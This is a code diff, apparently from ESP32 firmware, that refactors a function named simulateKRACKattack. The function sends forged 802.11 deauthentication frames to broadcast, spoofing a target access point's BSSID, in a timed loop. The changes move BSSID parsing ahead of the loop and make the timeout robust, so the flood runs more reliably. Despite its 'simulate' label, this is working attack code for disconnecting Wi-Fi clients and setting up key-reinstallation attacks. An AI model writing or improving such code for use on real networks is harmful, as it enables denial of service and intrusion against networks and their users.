@@ -46,30 +46,33 @@ KrackResult simulateKRACKattack(const String &bssid, uint8_t channel, uint16_t d
     unsigned long startTime = millis();
     Serial.println("Transmitting deauthentication frames to trigger key reinstallation...");
 
-    // Validate BSSID format once
+    // Validate BSSID format once and parse it upfront
     if (bssid.length() != 17) {  // "AA:BB:CC:DD:EE:FF" = 17 chars
         Serial.println("Error: Invalid BSSID format (expected AA:BB:CC:DD:EE:FF)");
         result.error = "Invalid BSSID format";
         return result;
     }
 
-    while (millis() - startTime < durationMs && attacking && TxArm::isArmed()) {
+    uint8_t parsedBSSID[6];
+    int n = sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+        &parsedBSSID[0], &parsedBSSID[1], &parsedBSSID[2],
+        &parsedBSSID[3], &parsedBSSID[4], &parsedBSSID[5]);
+
+    if (n != 6) {
+        Serial.println("Error: Failed to parse BSSID");
+        result.error = "Invalid BSSID format";
+        return result;
+    }
+
+    // Use safe timeout comparison (handles millis() wraparound)
+    while ((int32_t)(millis() - deadline) < 0 && attacking && TxArm::isArmed()) {
         DeauthFrame frame;
         frame.frame_control = 0xc0;
         frame.duration = 0;
-        frame.seq_ctrl = (esp_random() % 4096) << 4;  // Use esp_random instead of rand()
+        frame.seq_ctrl = (esp_random() % 4096) << 4;
         frame.reason_code = 7;
 
-        int n = sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-            &frame.bssid[0], &frame.bssid[1], &frame.bssid[2],
-            &frame.bssid[3], &frame.bssid[4], &frame.bssid[5]);
-
-        if (n != 6) {
-            Serial.println("Error: Failed to parse BSSID");
-            memset(frame.bssid, 0, 6);
-            break;
-        }
-
+        memcpy(frame.bssid, parsedBSSID, 6);
         memset(frame.da, 0xff, 6);
         memcpy(frame.sa, frame.bssid, 6);
 
